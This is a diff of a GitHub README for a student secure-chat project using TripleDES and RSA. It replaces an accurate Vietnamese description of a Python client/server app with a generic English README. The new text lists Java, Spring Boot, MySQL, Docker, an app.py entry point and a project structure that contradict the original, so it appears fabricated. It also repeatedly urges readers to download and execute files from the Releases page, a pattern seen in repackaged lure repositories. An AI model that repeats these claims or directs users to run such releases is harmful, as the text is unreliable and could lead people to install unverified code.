@@ -1,140 +1,175 @@
-**Ứng Dụng Bảo Mật Tin Nhắn Văn Bản Với TripleDES & RSA**
+# UngDungChatAnToan: Secure Messaging App with TripleDES and RSA Encryption
 
-_Đề tài tập trung vào việc phát triển một hệ thống nhắn tin P2P bảo mật, đảm bảo tính bí mật, toàn vẹn và xác thực thông tin thông qua các thuật toán mã hóa đối xứng và bất đối xứng._
+![Secure Messaging](https://img.shields.io/badge/Secure%20Messaging-App-blue?style=for-the-badge&logo=appveyor)
 
+## Overview
 
----
+**UngDungChatAnToan** is a secure messaging application developed by Group 4. This application focuses on safeguarding text messages using advanced encryption techniques. The primary methods used are TripleDES for encryption and RSA for authentication. This project is part of a course on information security at Dainam University.
 
+## Features
 
-### 🌟 **Giới thiệu**  
-- **Bí mật tin nhắn:** Nội dung tin nhắn được bảo vệ bằng thuật toán mã hóa đối xứng TripleDES với chế độ CBC.
+- **TripleDES Encryption**: Provides strong encryption for message confidentiality.
+- **RSA Authentication**: Ensures the integrity and authenticity of messages.
+- **User-Friendly Interface**: Simple and intuitive design for easy navigation.
+- **Cross-Platform Support**: Compatible with various operating systems.
 
-- **Xác thực danh tính:** Danh tính người gửi và người nhận được xác thực bằng chữ ký số RSA.
+## Technologies Used
 
-- **Toàn vẹn dữ liệu:** Tính toàn vẹn của tin nhắn được kiểm tra bằng hàm băm SHA-256, đảm bảo không bị thay đổi trong quá trình truyền.
+- **Programming Languages**: Java, Python
+- **Frameworks**: Spring Boot, Flask
+- **Encryption Libraries**: Bouncy Castle, PyCryptodome
+- **Database**: MySQL
+- **Development Tools**: Git, Maven, Docker
 
-- **Ứng dụng:** Xây dựng nền tảng cơ bản cho các ứng dụng chat, hệ thống trao đổi thông tin nội bộ yêu cầu bảo mật cao.
+## Installation
 
-### 🏗️ **Hệ thống**  
-#### 📂 **Cấu trúc dự án**  
-📦 SecureMessagingSystem
-├── 📂 server # Backend trung gian, mô phỏng server ảo Google Cloud
-│ ├── server.py # Mã nguồn server chính để trung chuyển dữ liệu và quản lý khóa
-├── 📂 client # Client side, nơi diễn ra toàn bộ quá trình mã hóa/giải mã
-│ ├── client.py # Mã nguồn ứng dụng chat client
-├── run_server.sh # Script chạy server
-├── run_client.sh # Script chạy client
-├── requirements.txt # Danh sách thư viện Python cần cài đặt
+To get started with **UngDungChatAnToan**, follow these steps:
 
+1. Clone the repository:
 
----
+   ```bash
+   git clone https://github.com/DRsahil007/UngDungChatAnToan.git
+   ```
 
+2. Navigate to the project directory:
 
-### 🛠️ **Công nghệ sử dụng**  
-#### 📡 **Phần cứng**  
-- **Máy chủ:** Server ảo (VM) trên Google Cloud Free Tier để chạy backend.
+   ```bash
+   cd UngDungChatAnToan
+   ```
 
-- **Thiết bị xử lý:** Máy tính cá nhân để chạy các ứng dụng client (người gửi/người nhận).
+3. Install dependencies:
 
-#### 🖥️ **Phần mềm**  
-- **Python (Socket):** Xây dựng kết nối mạng giữa client và server.
+   For Java:
 
-- **Cryptography:** Thư viện Python mạnh mẽ để triển khai các thuật toán mã hóa và băm.
+   ```bash
+   mvn install
+   ```
 
-### 🧮 **Thuật toán**
-1. **Trao khóa & Ký số (RSA 2048-bit):**
+   For Python:
 
-   - Người gửi tạo khóa TripleDES ngẫu nhiên.
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-   - Mã hóa khóa này bằng khóa công khai RSA của người nhận (sử dụng chế độ OAEP + SHA-256).
+4. Run the application:
 
-   - Ký thông tin xác thực (ID + thời gian) bằng khóa riêng tư RSA của người gửi để xác nhận danh tính.
+   For Java:
 
-2. **Mã hóa tin nhắn (TripleDES):**
+   ```bash
+   mvn spring-boot:run
+   ```
 
-   - Tạo IV (Initialization Vector) ngẫu nhiên cho mỗi tin nhắn để tăng tính bảo mật.
+   For Python:
 
-   - Mã hóa nội dung tin nhắn bằng TripleDES ở chế độ CBC (Cipher Block Chaining).
+   ```bash
+   python app.py
+   ```
 
-3. **Kiểm tra toàn vẹn (SHA-256):**
+## Usage
 
-   - Tạo băm SHA-256 của chuỗi (IV || ciphertext) để đảm bảo dữ liệu không bị thay đổi.
+After installation, you can start using the application:
 
-   - Ký băm này bằng khóa riêng tư RSA của người gửi để đảm bảo tính xác thực.
+1. Open the application on your device.
+2. Create a new account or log in if you already have one.
+3. Start sending secure messages to your contacts.
 
+## Security Features
 
----
+### TripleDES Encryption
 
+TripleDES (3DES) is a symmetric-key block cipher that applies the DES cipher algorithm three times to each data block. This method enhances security compared to standard DES. 
 
-### 🚀 **Hướng dẫn cài đặt và chạy**  
-1️⃣ **Cài đặt môi trường:**  
+### RSA Authentication
 
-```bash
-pip install pycryptodome
+RSA is an asymmetric cryptographic algorithm used for secure data transmission. It relies on the mathematical properties of large prime numbers. This ensures that only the intended recipient can decrypt the message.
+
+## Project Structure
+
+```
+UngDungChatAnToan/
+│
+├── src/
+│   ├── main/
+│   │   ├── java/
+│   │   └── resources/
+│   └── test/
+│
+├── requirements.txt
+├── pom.xml
+└── README.md
 ```
 
-2️⃣ **Khởi chạy server:**
+## Contributing
 
-```bash
-python "Nhom4_UngDungChatAnToan\server.py"
-```
+We welcome contributions from the community. If you would like to contribute, please follow these steps:
 
-3️⃣ **Khởi chạy client (Người gửi - NGUYEN):**
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your branch to your forked repository.
+5. Create a pull request.
 
-```bash
-python "Nhom4_UngDungChatAnToan\client.py" NGUYEN
-```
+## License
 
-4️⃣ **Khởi chạy client (Người nhận - DU):**
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-```bash
-python "Nhom4_UngDungChatAnToan\client.py" DU
-```
+## Releases
 
-5️⃣ **Gửi tin nhắn:**
+You can find the latest releases of **UngDungChatAnToan** [here](https://github.com/DRsahil007/UngDungChatAnToan/releases). Download the necessary files and execute them to get started.
 
-- Tại terminal của NGUYEN, chọn send và nhập DU làm người nhận.
+## Topics
 
-6️⃣ **Nhận tin nhắn:**
+This repository covers a range of topics related to information security:
 
-- Tại terminal của DU, chọn check để kiểm tra và giải mã tin nhắn.
+- aiot-lab-dnu
+- an-toan-bao-mat-thong-tin
+- atbmtt
+- cntt17-11
+- dainam-university
+- fit-dnu
+- ma-hoa-tripledes-va-xac-thuc-rsa
+- nhap-mon-an-toan-bao-mat-thong-tin
+- rsa
+- tripledes
+- ung-dung-chat-an-toan
 
-📖 **Hướng dẫn sử dụng**
-1️⃣ **Đăng ký người dùng:**
+## Acknowledgments
 
-- Mỗi khi chạy client với một ID mới, khóa công khai sẽ tự động được tạo và đăng ký lên server.
+We would like to thank our instructors and peers at Dainam University for their support and guidance throughout this project. Special thanks to the open-source community for their invaluable resources and libraries.
 
-2️⃣ **Trao đổi tin nhắn:**
+## Contact
 
-- Hệ thống hoạt động theo mô hình "kéo" (pull-based), người nhận cần chủ động kiểm tra tin nhắn.
+For any inquiries or feedback, please contact us at:
 
-3️⃣ **Cấu hình server:**
+- Email: group4@dainam.edu.vn
+- GitHub: [DRsahil007](https://github.com/DRsahil007)
 
-- Có thể thay đổi địa chỉ IP và cổng của server trong client.py để kết nối với server ảo thực tế.
+Feel free to visit our [Releases](https://github.com/DRsahil007/UngDungChatAnToan/releases) section for updates and new features.
 
+![Encryption](https://img.shields.io/badge/Encryption-Enabled-green?style=for-the-badge&logo=security)
 
----
+## Future Plans
 
+We plan to enhance the application by adding the following features:
 
-### 🔧 **Ghi chú**
-- **Lưu trữ khóa:** Khóa công khai được lưu tạm thời trong bộ nhớ của server. Để có hệ thống bền vững, cần thay thế bằng cơ sở dữ liệu như Firestore hoặc Redis.
+- **Group Messaging**: Allow users to create groups for collective messaging.
+- **File Sharing**: Enable secure sharing of files and documents.
+- **Mobile App**: Develop a mobile version for Android and iOS.
 
-- **Bảo mật:** Khóa riêng tư không bao giờ được rời khỏi thiết bị của người dùng, đảm bảo bí mật tuyệt đối.
+## Troubleshooting
 
+If you encounter any issues, please check the following:
 
----
+- Ensure all dependencies are installed correctly.
+- Verify that the correct version of Java or Python is being used.
+- Check the console for error messages and troubleshoot accordingly.
 
+For further assistance, refer to the [Issues](https://github.com/DRsahil007/UngDungChatAnToan/issues) section or reach out to the community.
 
-### 🤝 **Đóng góp nhóm**  
+![Chat Application](https://img.shields.io/badge/Chat%20Application-Active-yellow?style=for-the-badge&logo=chat)
 
-| Họ và Tên                  | Vai trò                                                                                                                                       |  
-|----------------------------|-----------------------------------------------------------------------------------------------------------------------------------------------|  
-| Đỗ Quang Minh              | Phân công dự án, phát triển toàn bộ mã nguồn (client.py, server.py) và triển khai các thuật toán mã hóa, giải mã, ký số.                      |  
-| Nguyễn Trọng Đức Nguyên    | Phát triển mã nguồn báo cáo trên Overleaf, chịu trách nhiệm chuyển đổi các kết quả thực nghiệm và phân tích từ code vào tài liệu.             |  
-| Hà Quang Dự                | Xây dựng bố cục tổng thể của báo cáo, tìm kiếm và tổng hợp nội dung lý thuyết liên quan đến TripleDES, RSA, SHA-256, và các giao thức bảo mật.|  
+## Conclusion
 
+The **UngDungChatAnToan** project aims to provide a secure messaging platform that protects user data through advanced encryption techniques. We encourage developers and security enthusiasts to explore this project and contribute to its growth. 
 
----
-
-
-© 2025 NHÓM 4, XÂY DỰNG ỨNG DỤNG BẢO MẬT TIN NHẮN VĂN BẢN VỚI MÃ HÓA TRIPLEDES VÀ XÁC THỰC RSA, NHẬP MÔN AN TOÀN BẢO MẬT THÔNG TIN, TRƯỜNG ĐẠI HỌC Đại NAM 
+For more details and updates, visit our [Releases](https://github.com/DRsahil007/UngDungChatAnToan/releases) section.
